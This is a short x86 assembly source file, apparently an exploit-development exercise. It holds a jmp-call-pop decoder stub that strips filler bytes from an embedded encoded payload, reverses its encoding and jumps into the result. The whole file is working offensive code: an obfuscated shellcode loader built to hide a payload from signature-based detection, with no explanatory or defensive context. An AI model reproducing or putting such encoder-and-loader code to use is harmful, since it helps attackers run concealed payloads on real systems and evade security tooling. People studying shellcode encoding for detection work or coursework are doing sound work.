; Decoder
; Author: buffered4ever
; 15-03-2019
global _start

section .text

_start:
	jmp short call_shellcode
	

decoder:
	pop esi
	xor ecx, ecx
	xor eax, eax
	xor ebx, ebx
	mov al, 1
	mov cl, 25
	lea edi, [esi]
decode1:
	mov bl, byte[esi+eax]
	xor bl, 0xaa
	jz decode2
        mov byte[esi+eax], bl
	add al, 2
	jmp short decode1

decode2:
	not byte[edi]
	add byte[edi], 0x04
	inc edi
	loop decode2
	jmp short EncodedShellcode



call_shellcode:
	call decoder
	EncodedShellcode: db 0xd2,0xe9,0xb3,0x31,0x95,0x7e,0x90,0x31,0x9b,0x7e,0xd4,0x0b,0x9a,0xd0,0x20,0x19,0x7a,0x8b,0xb0,0xd0,0x22,0xf9,0xf8,0x9c,0x83,0xaa
